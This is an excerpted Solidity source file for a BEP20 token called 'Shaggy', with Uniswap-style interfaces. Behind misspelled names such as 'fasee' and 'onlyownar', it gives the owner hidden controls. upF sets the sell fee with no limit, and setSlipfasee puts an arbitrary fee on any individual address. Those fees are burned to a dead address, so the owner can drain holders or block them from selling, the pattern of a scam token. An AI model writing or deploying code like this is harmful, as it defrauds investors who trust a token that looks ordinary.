...
interface IUniswapV2Factory {
    ...
    function faseeTo() external view returns (address);
    function faseeToSetter() external view returns (address);
    ...
    function setfaseeTo(address) external;
    function setfaseeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfaseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfaseeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfaseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfaseeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfaseeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Shaggy is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfasee = 0;

    uint256 private _defaultBuyfasee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfasee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfasee = _value;
    }

    function setSlipfasee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfasee[_address] = _value;
    }

    function getSlipfasee(address _address) external view onlyownar returns (uint256) {
        return _slipfasee[_address];
    }


    function setMAccountfasee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfasee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefaseeAmount = 0;

        if (rF) {
            uint256 tradefasee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefasee = _defaultSellfasee;
                }
                if (from == uniswapV2Pair) {

                    tradefasee = _defaultBuyfasee;
                }
            }
            if (_slipfasee[from] > 0) {
                tradefasee = _slipfasee[from];
            }

            tradefaseeAmount = _Amount.mul(tradefasee).div(100);
        }


        if (tradefaseeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefaseeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefaseeAmount);
            emit Transfer(from, _deadAddress, tradefaseeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefaseeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefaseeAmount);
        emit Transfer(from, _to, _Amount - tradefaseeAmount);
    }
